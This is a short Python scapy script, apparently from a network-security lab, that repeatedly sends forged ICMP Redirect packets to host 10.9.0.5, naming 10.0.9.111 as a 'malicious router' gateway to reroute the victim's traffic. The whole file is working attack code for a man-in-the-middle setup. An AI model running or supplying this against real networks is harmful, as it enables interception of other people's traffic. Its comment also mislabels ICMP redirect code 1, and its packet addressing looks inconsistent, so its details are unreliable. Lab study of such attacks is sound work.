#!/usr/bin/python3

from scapy.all import *
import time

ip = IP(src = "10.0.9.111", dst = "10.9.0.5")
icmp = ICMP(type=5, code=1)  # Type 5 for ICMP Redirect, Code 1 for Redirect Datagram for the Network
icmp.gw = "10.0.9.111"  # Malicious router IP address

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = "192.168.60.5", dst = "10.0.9.111")

while True:
	send(ip/icmp/ip2/ICMP());
	time.sleep(3)